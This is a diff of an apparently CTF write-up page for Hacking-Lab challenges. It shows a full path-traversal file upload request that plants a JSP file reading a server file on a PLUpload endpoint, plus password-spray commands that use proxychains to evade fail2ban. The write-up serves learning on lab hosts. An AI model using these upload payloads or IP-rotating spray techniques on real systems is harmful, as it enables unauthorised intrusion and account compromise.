+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.FileInputStream&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.File&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.InputStreamReader&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.net.URL&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.FileReader&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> import<span style="color:#555">=</span><span style="color:#c30">&#34;java.io.BufferedReader&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;%</span><span style="color:#99f">@page</span> contentType<span style="color:#555">=</span><span style="color:#c30">&#34;text/html&#34;</span> pageEncoding<span style="color:#555">=</span><span style="color:#c30">&#34;UTF-8&#34;</span><span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;!</span>DOCTYPE html<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;</span>html<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#555">&lt;</span>head<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#555">&lt;</span>meta http<span style="color:#555">-</span>equiv<span style="color:#555">=</span><span style="color:#c30">&#34;Content-Type&#34;</span> content<span style="color:#555">=</span><span style="color:#c30">&#34;text/html; charset=UTF-8&#34;</span><span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#555">&lt;</span>title<span style="color:#555">&gt;</span>Read Text<span style="color:#555">&lt;/</span>title<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#555">&lt;/</span>head<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#555">&lt;</span>body<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#555">&lt;%</span>
+</span></span><span style="display:flex;"><span>            String txtFilePath <span style="color:#555">=</span> <span style="color:#c30">&#34;/var/gold.txt&#34;</span><span style="color:#555">;</span>
+</span></span><span style="display:flex;"><span>            BufferedReader reader <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> BufferedReader<span style="color:#555">(</span><span style="color:#069;font-weight:bold">new</span> FileReader<span style="color:#555">(</span>txtFilePath<span style="color:#555">));</span>
+</span></span><span style="display:flex;"><span>            StringBuilder sb <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> StringBuilder<span style="color:#555">();</span>
+</span></span><span style="display:flex;"><span>            String line<span style="color:#555">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">while</span><span style="color:#555">((</span>line <span style="color:#555">=</span> reader<span style="color:#555">.</span><span style="color:#309">readLine</span><span style="color:#555">())!=</span> <span style="color:#069;font-weight:bold">null</span><span style="color:#555">){</span>
+</span></span><span style="display:flex;"><span>                sb<span style="color:#555">.</span><span style="color:#309">append</span><span style="color:#555">(</span>line<span style="color:#555">+</span><span style="color:#c30">&#34;\n&#34;</span><span style="color:#555">);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#555">}</span>
+</span></span><span style="display:flex;"><span>            out<span style="color:#555">.</span><span style="color:#309">println</span><span style="color:#555">(</span>sb<span style="color:#555">.</span><span style="color:#309">toString</span><span style="color:#555">());</span> 
+</span></span><span style="display:flex;"><span>        <span style="color:#555">%&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#555">&lt;/</span>body<span style="color:#555">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#555">&lt;/</span>html<span style="color:#555">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Below is the upload request that I use to upload the jsp file to <code>../../examples/jsp/jsp2/el/cho.jsp</code></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>POST //upload HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Content-Type: multipart/form-data; boundary=---------------------------34999802810414628822789368601
+</span></span><span style="display:flex;"><span>Content-Length: 1479
+</span></span><span style="display:flex;"><span>Origin: https://e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Referer: https://e95ca4f3-a493-4192-802e-7af99f4262bc.idocker.vuln.land/
+</span></span><span style="display:flex;"><span>Cookie: JSESSIONID=6E2119D7A2763AC0C88B4888A10C0E8B
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest: empty
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode: cors
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site: same-origin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;name&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>../../examples/jsp/jsp2/el/cho.jsp
+</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;chunk&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;chunks&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1
+</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601
+</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;file&#34;; filename=&#34;cho.jsp&#34;
+</span></span><span style="display:flex;"><span>Content-Type: application/octet-stream
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.FileInputStream&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.File&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.InputStreamReader&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.net.URL&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.FileReader&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;java.io.BufferedReader&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;%@page contentType=&#34;text/html&#34; pageEncoding=&#34;UTF-8&#34;%&gt;
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>&lt;html&gt;
+</span></span><span style="display:flex;"><span>    &lt;head&gt;
+</span></span><span style="display:flex;"><span>        &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=UTF-8&#34;&gt;
+</span></span><span style="display:flex;"><span>        &lt;title&gt;Read Text&lt;/title&gt;
+</span></span><span style="display:flex;"><span>    &lt;/head&gt;
+</span></span><span style="display:flex;"><span>    &lt;body&gt;
+</span></span><span style="display:flex;"><span>        &lt;%
+</span></span><span style="display:flex;"><span>            String txtFilePath = &#34;/var/gold.txt&#34;;
+</span></span><span style="display:flex;"><span>            BufferedReader reader = new BufferedReader(new FileReader(txtFilePath));
+</span></span><span style="display:flex;"><span>            StringBuilder sb = new StringBuilder();
+</span></span><span style="display:flex;"><span>            String line;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            while((line = reader.readLine())!= null){
+</span></span><span style="display:flex;"><span>                sb.append(line+&#34;\n&#34;);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            out.println(sb.toString()); 
+</span></span><span style="display:flex;"><span>        %&gt;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    &lt;/body&gt;
+</span></span><span style="display:flex;"><span>&lt;/html&gt;
+</span></span><span style="display:flex;"><span>-----------------------------34999802810414628822789368601--
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After upload it, we can simply open the file
+<p class="markdown-image">
+  <img src="https://i.imgur.com/a0sHb0o.png" alt=""  />
+</p></p>
+<blockquote>
+<p>Flag: New is always better. - Barney Stinson</p>
+</blockquote>
+<h1 id="misc">Misc <a href="#misc" class="anchor">#</a></h1>
+<h2 id="ctf-spray-attack-ssh">CTF Spray Attack SSH <a href="#ctf-spray-attack-ssh" class="anchor">#</a></h2>
+<p>With the help of proxychains, we can dynamically change our ip to bypass the fail2ban. Command that I used:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains sshpass -p <span style="color:#f60">93370760</span> ssh -o <span style="color:#033">StrictHostKeyChecking</span><span style="color:#555">=</span>no user_100283@pwspray.vm.vuln.land -p <span style="color:#f60">22</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><p class="markdown-image">
+  <img src="https://i.imgur.com/mT0j5pe.png" alt=""  />
+</p></p>
+<h2 id="ctf-spray-attack-http">CTF Spray Attack HTTP <a href="#ctf-spray-attack-http" class="anchor">#</a></h2>
+<p>With the help of proxychains, we can dynamically change our ip to bypass the fail2ban. Command that I used:</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>proxychains curl --user user_140244:6ed42dd7 http://pwspray.vm.vuln.land -v
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><p class="markdown-image">
+  <img src="https://i.imgur.com/e3Yuq6D.png" alt=""  />
+</p></p>
+<h1 id="pwn">Pwn <a href="#pwn" class="anchor">#</a></h1>
 <h2 id="crysys">CrySYS <a href="#crysys" class="anchor">#</a></h2>
 <p>We were given a binary that is pretty short</p>
 <div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
@@ -920,6 +924,7 @@ So to generate the password (which is the flag), we just need to do:
 <blockquote>
 <p>Flag: HL{PPPwned-7165-4679-8c39-cf7633bdf81b}</p>
 </blockquote>
+<h1 id="crypto">Crypto <a href="#crypto" class="anchor">#</a></h1>
 <h2 id="idbased1">IDBased1 <a href="#idbased1" class="anchor">#</a></h2>
 <p>After checking with the given ciphertexts consist of encrypted message of &lsquo;This is the test message number x&rsquo;, there is a collision between the ciphertexts CEO and the test ciphertexts</p>
 <p>CEO ciphertexts:</p>
@@ -1013,11 +1018,23 @@ So to generate the password (which is the flag), we just need to do:
     <li><a href="#license-key-level-2">License Key Level 2</a></li>
     <li><a href="#license-key-level-3">License Key Level 3</a></li>
     <li><a href="#license-key-level-4">License Key Level 4</a></li>
+    <li><a href="#crack-me-android">Crack me Android</a></li>
+  </ul>
+
+  <ul>
     <li><a href="#plupload">PLUpload</a></li>
+  </ul>
+
+  <ul>
     <li><a href="#ctf-spray-attack-ssh">CTF Spray Attack SSH</a></li>
     <li><a href="#ctf-spray-attack-http">CTF Spray Attack HTTP</a></li>
-    <li><a href="#crack-me-android">Crack me Android</a></li>
+  </ul>
+
+  <ul>
     <li><a href="#crysys">CrySYS</a></li>
+  </ul>
+
+  <ul>
     <li><a href="#idbased1">IDBased1</a></li>
   </ul>
 </nav>
